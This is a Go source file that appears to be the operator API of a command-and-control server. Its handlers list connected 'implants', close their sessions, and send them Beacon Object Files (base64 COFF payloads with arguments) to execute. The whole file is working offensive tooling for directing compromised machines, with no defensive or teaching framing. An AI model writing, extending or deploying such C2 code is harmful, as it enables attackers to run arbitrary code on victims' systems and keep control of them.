package main

import (
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
)

// mountAPI registers all REST handlers on the given mux.
func mountAPI(mux *http.ServeMux) {
	mux.HandleFunc("/api/implants", implantsHandler)
	mux.HandleFunc("/api/implants/", implantHandler)
	mux.HandleFunc("/api/bofs", bofsHandler)
	mux.HandleFunc("/api/bofs/", bofRunHandler)
	mux.HandleFunc("/ws", handleWS)
}

// GET /api/implants -> [{id,addr,since}, ...]
func implantsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "GET only", http.StatusMethodNotAllowed)
		return
	}
	writeJSON(w, http.StatusOK, manager.List())
}

// /api/implants/{id}  with sub-actions:
//   POST /api/implants/{id}/hello
//   POST /api/implants/{id}/bof       body: {"bof":"<name|b64>","args":"<b64>"}
//   DELETE /api/implants/{id}
func implantHandler(w http.ResponseWriter, r *http.Request) {
	rest := strings.TrimPrefix(r.URL.Path, "/api/implants/")
	parts := strings.SplitN(rest, "/", 2)
	if len(parts) == 0 || parts[0] == "" {
		http.NotFound(w, r)
		return
	}
	id, err := strconv.ParseUint(parts[0], 10, 64)
	if err != nil {
		http.Error(w, "bad implant id", http.StatusBadRequest)
		return
	}
	action := ""
	if len(parts) == 2 {
		action = parts[1]
	}
	s, ok := manager.Get(id)
	if !ok {
		http.Error(w, "no such implant", http.StatusNotFound)
		return
	}

	switch {
	case action == "" && r.Method == http.MethodDelete:
		s.Close()
		writeJSON(w, http.StatusOK, map[string]string{"status": "closed"})
	case action == "hello" && r.Method == http.MethodPost:
		if err := s.Send(serverMsg{Type: "hello"}); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		writeJSON(w, http.StatusOK, map[string]string{"status": "sent"})
	case action == "bof" && r.Method == http.MethodPost:
		var body struct {
			Bof  string `json:"bof"`  // BOF library name OR raw base64 COFF
			Args string `json:"args"` // base64 raw arg buffer (optional)
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
			return
		}
		fileB64, err := boflib.Resolve(body.Bof)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		if err := s.Send(serverMsg{Type: "bof", File: fileB64, Args: body.Args}); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		writeJSON(w, http.StatusOK, map[string]string{"status": "sent"})
	default:
		http.Error(w, "unsupported", http.StatusMethodNotAllowed)
	}
}

func writeJSON(w http.ResponseWriter, code int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(v)
}
